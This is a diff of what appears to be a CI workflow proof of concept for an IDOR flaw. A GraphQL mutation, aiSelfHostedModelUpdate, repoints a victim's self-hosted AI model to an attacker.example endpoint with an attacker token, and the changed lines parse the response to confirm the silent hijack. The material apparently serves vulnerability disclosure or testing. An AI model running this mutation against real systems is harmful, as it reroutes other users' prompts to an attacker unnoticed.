@@ -163,22 +163,21 @@ print(vals[0]['name'] if vals else 'MISTRAL')
             -d "{\"query\":\"mutation { aiSelfHostedModelUpdate(input: { id: \\\"$MODEL_GID2\\\", name: \\\"victim-model-2\\\", model: $MODEL_ENUM, endpoint: \\\"https://attacker.example/v1\\\", apiToken: \\\"attacker-controlled-token\\\" }) { selfHostedModel { id endpoint } errors } }\"}")
           echo "Response: $UPDATE_RESP"
           echo ""
-          python3 -c "
-import sys, json
-raw = '''$UPDATE_RESP'''
+          echo "$UPDATE_RESP" | python3 -c "
+import sys,json
+raw=sys.stdin.read()
 try:
-    d = json.loads(raw)
-    r = d.get('data',{}).get('aiSelfHostedModelUpdate',{}) or {}
-    errors = r.get('errors', d.get('errors', ['PARSE']))
-    endpoint = (r.get('selfHostedModel') or {}).get('endpoint', 'N/A')
-    print('errors:', errors)
-    print('endpoint in response:', endpoint)
-    if errors == [] and 'attacker' in str(endpoint):
-        print('✅ UPDATE IDOR CONFIRMED: errors:[] — endpoint silently replaced with attacker-controlled server')
-        print('   All AI prompts from victim now route to: ' + str(endpoint))
+  d=json.loads(raw)
+  r=(d.get('data') or {}).get('aiSelfHostedModelUpdate') or {}
+  errors=r.get('errors',d.get('errors',['PARSE']))
+  ep=(r.get('selfHostedModel') or {}).get('endpoint','N/A')
+  print('errors:',errors)
+  print('endpoint:',ep)
+  if errors==[] and 'attacker' in str(ep):
+    print('✅ UPDATE IDOR CONFIRMED: errors:[] — endpoint replaced with attacker-controlled server')
+    print('Route: '+str(ep))
 except Exception as e:
-    print('parse error:', e)
-    print('raw:', raw[:500])
+  print('parse error:',e,raw[:300])
 " 2>/dev/null || echo "UPDATE response: $UPDATE_RESP"
 
       - name: Verify victim sees no change (attack is undetectable)
